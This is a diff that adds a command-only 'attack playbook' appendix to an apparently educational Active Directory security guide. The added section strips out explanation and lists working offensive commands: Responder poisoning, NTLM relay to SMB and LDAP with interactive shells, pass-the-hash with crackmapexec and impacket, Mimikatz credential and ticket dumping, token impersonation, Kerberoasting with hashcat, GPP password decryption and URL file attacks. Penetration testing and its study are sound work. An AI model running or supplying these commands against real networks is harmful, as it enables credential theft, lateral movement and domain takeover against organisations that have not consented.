@@ -343,6 +343,257 @@ It should only be used for:
 
 ---
 
+## Practical Exploitation (Attack Playbooks)
+
+This section is a consolidated, command-focused appendix.
+It contains only practical exploitation commands, grouped by attack type.
+Conceptual explanations are intentionally omitted.
+
+---
+
+### LLMNR / NBT-NS Poisoning
+
+```
+responder -I eth0 -rdwv
+```
+
+Captured:
+* NetNTLMv2 hashes (offline brute-force only)
+
+---
+
+### SMB Relay
+
+Discovery (SMB signing):
+```
+nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
+```
+
+Responder configuration:
+```
+/etc/responder/Responder.conf
+SMB = Off
+HTTP = Off
+```
+
+Run responder:
+```
+responder -I eth0 -rdwv
+```
+
+Relay attack:
+```
+impacket-ntlmrelayx -tf targets.txt -smb2support
+```
+
+Interactive shell:
+```
+impacket-ntlmrelayx -tf targets.txt -smb2support -i
+nc 127.0.0.1 11001
+```
+
+---
+
+### Remote Command Execution (Post-Auth)
+
+```
+impacket-psexec domain.local/user:password@192.168.57.130
+```
+
+```
+impacket-wmiexec domain.local/user:password@192.168.57.130
+```
+---
+
+### IPv6 Attack (mitm6 + LDAP Relay)
+
+```
+mitm6 -d domain.local
+```
+
+```
+impacket-ntlmrelayx -6 -t ldaps://192.168.57.133 -wh fakewpad.domain.local -l lootme --delegate-access
+```
+
+Artifacts:
+* Machine account creation
+* LDAP domain dump
+* RBCD attack material
+
+---
+
+### Relay captured authentication using ntlmrelayx.
+
+**PowerView Enumeration:**
+
+```
+powershell -ep bypass
+```
+
+```
+. .\PowerView.ps1
+```
+
+```
+Get-NetDomain
+```
+
+```
+Get-NetDomainController
+```
+
+```
+Get-NetUser
+```
+
+```
+Get-NetComputer -FullData
+```
+
+```
+Get-NetGroup -GroupName *admin*
+```
+
+```
+Invoke-ShareFinder
+```
+
+```
+Get-NetGPO
+```
+
+---
+
+### BloodHound Collection
+
+```
+powershell -ep bypass
+```
+
+```
+. .\SharpHound.ps1
+```
+
+```
+Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName loot.zip
+```
+---
+
+## Pass-the-Password / Pass-the-Hash
+
+```
+crackmapexec 10.0.3.0/24 -u user -d domain -p password
+```
+
+```
+crackmapexec 10.0.3.0/24 -u user -d domain -H HASH --local
+```
+
+```
+impacket-wmiexec -hashes :LMHASH:NTHASH domain/user@10.0.3.15
+```
+
+```
+impacket-psexec domain/user:password@10.0.3.15
+```
+
+---
+
+## Token Impersonation
+
+```
+privilege::debug
+```
+
+```
+sekurlsa::logonpasswords
+```
+
+```
+sekurlsa::tickets /export
+```
+
+```
+kerberos::ptt admin.kirbi
+```
+
+Verification:
+```
+dir \\dc01.domain.local\c$
+```
+
+Metasploit:
+```
+load incognito
+```
+
+```
+list_tokens -u
+```
+
+```
+impersonate_token DOMAIN\Administrator
+```
+
+---
+
+### Kerberoasting
+
+```
+impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.57.130 -request
+```
+
+Hash format:
+```
+$krb5tgs$23$*
+```
+
+Offline cracking:
+```
+hashcat -m 13100 hash.txt wordlist.txt
+```
+
+GPP (MS14-025)
+
+Browse SYSVOL:
+```
+\\DC\SYSVOL\domain\Policies\
+```
+
+Decrypt:
+```
+gpp-decrypt <cpassword>
+```
+
+### URL File Attacks
+
+```
+\\192.168.1.10\share\icon.ico
+```
+
+Triggered automatically when a user opens the folder.
+
+
+### Mimikatz (Offline / Post-Exploitation)
+
+```
+sekurlsa::logonpasswords
+```
+
+```
+lsadump::sam
+```
+
+```
+lsadump::secrets
+```
+
+Recommended usage:
+* Offline dump analysis
+* Kerberos ticket operations only
+
+---
+
 ## Final Conclusion
 
 Active Directory compromises rarely rely on exploits or zero-days.
